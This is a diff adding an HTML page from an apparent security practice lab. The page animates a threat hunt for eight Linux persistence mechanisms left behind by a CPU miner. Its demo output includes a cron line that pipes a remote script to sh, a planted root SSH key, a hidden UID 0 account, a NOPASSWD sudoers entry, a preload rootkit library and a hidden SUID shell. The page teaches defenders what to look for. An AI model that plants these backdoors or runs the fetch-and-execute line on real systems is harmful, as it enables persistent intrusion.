@@ -1,0 +1,143 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Linux Persistence Hunt</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,800&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<style>
+/* Layout: one 9:16 reel frame, centred; chip grid of 8 hiding spots above a live terminal; caption + controls below */
+:root{
+  --ink:#0d1117; --panel:#141b26; --line:#243045; --fg:#e6ebf2; --muted:#8592a8;
+  --signal:#ffb02e; --bad:#ff5d6c; --badbg:rgba(255,93,108,.10); --ok:#5fd4a4;
+  --display:"Bricolage Grotesque",ui-sans-serif,system-ui,sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  color-scheme:dark;
+}
+html,body{background:var(--ink);color:var(--fg)}
+body{font-family:var(--display);padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:20px}
+.reel{max-width:440px;margin:0 auto;aspect-ratio:9/16;max-height:calc(100vh - 40px);min-height:640px;position:relative;overflow:hidden;
+  border:1px solid var(--line);border-radius:18px;padding:22px 18px 16px;display:flex;flex-direction:column;gap:14px;
+  background:
+    linear-gradient(var(--line) 1px,transparent 1px) 0 0/28px 28px,
+    linear-gradient(90deg,var(--line) 1px,transparent 1px) 0 0/28px 28px,var(--ink);
+  background-blend-mode:normal}
+.reel::before{content:"";position:absolute;inset:0;background:radial-gradient(120% 70% at 50% 30%,rgba(13,17,23,.55),rgba(13,17,23,.95));pointer-events:none}
+.reel>*{position:relative}
+.eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.28em;color:var(--muted);text-transform:uppercase;text-align:center}
+h1{margin:0;font-weight:800;font-size:clamp(26px,7.4vw,34px);line-height:1.02;text-align:center;text-wrap:balance;letter-spacing:-.02em}
+h1 em{font-style:normal;color:var(--signal)}
+.sub{font-family:var(--mono);font-size:11.5px;color:var(--muted);text-align:center;margin-top:-6px}
+.chips{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
+.chip{font:500 11px/1.2 var(--mono);color:var(--muted);background:var(--panel);border:1px solid var(--line);border-radius:7px;
+  padding:7px 6px;text-align:left;cursor:pointer;transition:background .25s,color .25s,border-color .25s;min-width:0}
+.chip b{display:block;font-weight:600;font-size:10px;opacity:.7;margin-bottom:2px}
+.chip.done{color:var(--fg)}
+.chip.on{background:var(--signal);color:#1a1200;border-color:var(--signal)}
+.chip:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+.term{flex:1;min-height:0;background:rgba(20,27,38,.92);border:1px solid var(--line);border-radius:10px;display:flex;flex-direction:column;overflow:hidden}
+.bar{display:flex;align-items:center;gap:6px;padding:8px 10px;border-bottom:1px solid var(--line);font:500 11px var(--mono);color:var(--muted)}
+.bar i{width:7px;height:7px;border-radius:50%;background:var(--line)}
+.bar span{margin-left:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.out{padding:10px 12px;font:12px/1.55 var(--mono);overflow:auto;flex:1;min-width:0}
+.out div{white-space:pre-wrap;word-break:break-all}
+.cmd{color:var(--fg);font-weight:500}.cmd::before{content:"$ ";color:var(--ok)}
+.dim{color:var(--muted)}
+.bad{color:var(--bad);background:var(--badbg);margin:0 -12px;padding:0 12px;border-left:2px solid var(--bad)}
+.caret{display:inline-block;width:7px;height:13px;background:var(--fg);vertical-align:-2px;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.cap{min-height:3.2em;text-align:center;font-weight:500;font-size:15.5px;line-height:1.35;text-wrap:balance}
+.cap small{display:block;font:500 10.5px var(--mono);letter-spacing:.18em;color:var(--signal);text-transform:uppercase;margin-bottom:4px}
+.foot{display:flex;align-items:center;gap:10px}
+.prog{flex:1;height:3px;background:var(--line);border-radius:2px;overflow:hidden}
+.prog i{display:block;height:100%;width:0;background:var(--signal);transition:width .3s}
+.ctl{font:600 12px var(--mono);color:var(--fg);background:var(--panel);border:1px solid var(--line);border-radius:7px;padding:6px 10px;cursor:pointer}
+.ctl:focus-visible{outline:2px solid var(--signal);outline-offset:2px}
+.note{max-width:440px;margin:14px auto 0;font:12px/1.5 var(--mono);color:var(--muted);text-align:center}
+@media (prefers-reduced-motion:reduce){.caret{animation:none}.chip,.prog i{transition:none}}
+</style>
+
+<div class="reel" aria-label="Animated walkthrough: where attackers hide persistence on Linux">
+  <div class="eyebrow">Linux · Threat hunt · Part 2</div>
+  <h1>8 places attackers <em>hide to come back</em></h1>
+  <div class="sub">same box as the CPU miner · demo output</div>
+  <div class="chips" id="chips"></div>
+  <div class="term">
+    <div class="bar"><i></i><i></i><i></i><span id="bartitle"></span></div>
+    <div class="out" id="out" aria-live="polite"></div>
+  </div>
+  <div class="cap" id="cap"></div>
+  <div class="foot">
+    <button class="ctl" id="prev" aria-label="Previous step">‹</button>
+    <button class="ctl" id="play" aria-label="Pause">Pause</button>
+    <button class="ctl" id="next" aria-label="Next step">›</button>
+    <div class="prog"><i id="prog"></i></div>
+  </div>
+</div>
+<p class="note">Killing the miner isn't enough. Each red line below would bring it back after a reboot or a new login.</p>
+
+<script>
+const S=[
+ {k:"cron",t:"scheduled re-download",cmd:"sudo crontab -l -u deploy",o:[["# m h dom mon dow command","dim"],["0 2 * * * /home/deploy/backup.sh",""],["*/5 * * * * curl -fsSL http://198.51.100.7/u.sh | sh","bad"]],
+  c:"Piping a remote script to sh every 5 minutes re-installs the payload."},
+ {k:"systemd",t:"new services",cmd:"ls -lt /etc/systemd/system/*.service | head -3",o:[["-rw-r--r-- root 312 Oct  9 03:44 dbus-helper.service","bad"],["-rw-r--r-- root 498 Aug 21 10:02 nginx.service",""],["$ grep Exec /etc/systemd/system/dbus-helper.service","cmdx"],["ExecStart=/var/tmp/.cache/dbus-helper","bad"]],
+  c:"A unit created minutes after the break-in, running from /var/tmp."},
+ {k:"ssh keys",t:"planted keys",cmd:"sudo cat /root/.ssh/authorized_keys",o:[["ssh-ed25519 AAAAC3Nz…q9Xf sara@laptop",""],["ssh-rsa AAAAB3Nz…7kQ== root@kali","bad"]],
+  c:"An unknown key gives the attacker a way in even after passwords change."},
+ {k:"bashrc",t:"login hooks",cmd:"tail -3 /home/deploy/.bashrc",o:[["alias ll='ls -alF'",""],["export PATH=$PATH:~/bin",""],["(nohup /tmp/.x/kworkerd >/dev/null 2>&1 &)","bad"]],
+  c:"Every time deploy logs in, the miner silently restarts."},
+ {k:"users",t:"extra UID 0",cmd:"awk -F: '$3==0' /etc/passwd",o:[["root:x:0:0:root:/root:/bin/bash",""],["sysbackup:x:0:0::/root:/bin/bash","bad"]],
+  c:"Only root should have UID 0. A second one is a hidden root account."},
+ {k:"sudoers",t:"silent privilege",cmd:"sudo grep -r NOPASSWD /etc/sudoers*",o:[["/etc/sudoers.d/90-cloud:ubuntu ALL=(ALL) NOPASSWD:ALL","dim"],["/etc/sudoers.d/zz-tmp:deploy ALL=(ALL) NOPASSWD:ALL","bad"]],
+  c:"The hijacked account can now become root without a password."},
+ {k:"preload",t:"rootkit lib",cmd:"cat /etc/ld.so.preload",o:[["/usr/lib/x86_64-linux-gnu/libprocesshider.so","bad"],["# this file normally doesn't exist","dim"]],
+  c:"A preloaded library can hide the miner from ps and top. Check /proc too."},
+ {k:"suid",t:"new SUID files",cmd:"sudo find / -perm -4000 -mtime -7 2>/dev/null",o:[["/usr/local/bin/.sh","bad"],["$ ls -l /usr/local/bin/.sh","cmdx"],["-rwsr-xr-x root root 1.2M Oct  9 03:47 .sh","bad"]],
+  c:"A hidden, freshly made SUID shell is an instant root backdoor."}
+];
+const reduce=matchMedia("(prefers-reduced-motion: reduce)").matches;
+const $=id=>document.getElementById(id), out=$("out");
+S.forEach((s,i)=>{const b=document.createElement("button");b.className="chip";b.id="chip"+i;
+  b.innerHTML=`<b>${String(i+1).padStart(2,"0")}</b>${s.k}`;b.onclick=()=>go(i,true);$("chips").appendChild(b)});
+let cur=0,timer=null,playing=!reduce,run=0;
+const wait=ms=>new Promise(r=>timer=setTimeout(r,ms));
+function line(txt,cls){const d=document.createElement("div");
+  if(cls==="cmdx"){d.className="cmd";d.textContent=txt.replace(/^\$ /,"")}else{d.className=cls||"";d.textContent=txt}
+  out.appendChild(d);return d}
+function paint(i,full){
+  S.forEach((s,j)=>{const c=$("chip"+j);c.classList.toggle("on",j===i);c.classList.toggle("done",j<i)});
+  $("bartitle").textContent="hunting: "+S[i].t;
+  $("cap").innerHTML=`<small>${String(i+1).padStart(2,"0")} · ${S[i].k}</small>${S[i].c}`;
+  $("prog").style.width=((i+1)/S.length*100)+"%";
+  out.innerHTML="";
+  if(full){line(S[i].cmd,"cmd");S[i].o.forEach(([t,c])=>line(t,c))}
+}
+async function show(i){
+  const me=++run;clearTimeout(timer);cur=i;paint(i,!playing);
+  if(!playing)return;
+  const c=line("","cmd"),car=document.createElement("span");car.className="caret";
+  for(const ch of S[i].cmd){if(me!==run)return;c.textContent+=ch;c.appendChild(car);await wait(26)}
+  car.remove();await wait(350);
+  for(const [t,cl] of S[i].o){if(me!==run)return;line(t,cl);await wait(cl==="cmdx"?500:320)}
+  await wait(2600);if(me!==run)return;
+  show((i+1)%S.length);
+}
+function go(i,user){if(user&&playing){/* keep playing from the chosen step */}show((i+S.length)%S.length)}
+$("prev").onclick=()=>go(cur-1,true);$("next").onclick=()=>go(cur+1,true);
+$("play").onclick=()=>{playing=!playing;$("play").textContent=playing?"Pause":"Play";$("play").setAttribute("aria-label",playing?"Pause":"Play");show(cur)};
+$("play").textContent=playing?"Pause":"Play";
+paint(0,true); // complete first frame at rest
+if(playing)timer=setTimeout(()=>show(0),900);
+</script>
+
+
+<!-- practice-hub nav -->
+<style>
+#ph-nav{position:fixed;left:14px;bottom:14px;z-index:2147483000;display:flex;gap:8px;align-items:center;font:600 13px/1.2 system-ui,-apple-system,Segoe UI,sans-serif}
+#ph-nav a{background:#1f2633;color:#fff;text-decoration:none;padding:9px 14px;border-radius:999px;box-shadow:0 6px 18px rgba(0,0,0,.25);transition:transform .15s}
+#ph-nav a:hover{transform:translateY(-2px)}
+#ph-nav span{background:#fff4e5;color:#7a4300;border:1px solid #f5c27a;padding:7px 11px;border-radius:999px;box-shadow:0 4px 12px rgba(0,0,0,.12)}
+#ph-nav button{border:0;background:#fff;color:#555;border-radius:50%;width:26px;height:26px;cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,.2);font-size:13px}
+#ph-nav.min span{display:none}
+@media print{#ph-nav{display:none}}
+</style>
+<div id="ph-nav"><a href="../index.html">&larr; All labs</a><span>&#9888; Practice only &middot; Exam is on a real VM</span><button title="Hide note" onclick="this.parentNode.classList.toggle('min')">&times;</button></div>
+</body></html>
